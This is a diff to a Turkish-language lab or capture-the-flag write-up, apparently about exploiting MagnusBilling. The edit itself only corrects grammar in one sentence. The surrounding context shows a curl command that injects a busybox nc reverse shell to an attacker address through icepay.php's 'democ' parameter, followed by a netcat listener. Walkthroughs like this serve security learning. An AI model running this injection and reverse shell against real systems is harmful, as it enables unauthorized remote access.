@@ -62,7 +62,7 @@ Payloadı base64 ile kodlamamıza gerek yok, herhalde bir sorun ile karşılaşm
 $ curl 'http://10.10.66.239/mbilling/lib/icepay/icepay.php?democ=;busybox+nc+10.21.66.61+1234+-e+/bin/bash;'
 ```
 
-Sistemde ncat aracı bulunduğunu tahmin ettim ve dinlediğim `1234` numaralı port üzerinden bağlantı alabilmek için yukarıda gördüğünüz komutu kullandım. Herhangi bir sorun çıkarmadan bağlantımı alabildim.
+Sistemde ncat aracının bulunduğunu tahmin ettim ve dinlediğim `1234` numaralı port üzerinden bağlantı alabilmek için yukarıda gördüğünüz komutu kullandım. Herhangi bir sorun çıkarmadan bağlantımı alabildim.
 
 ```console
 $ nc -nlvp 1234
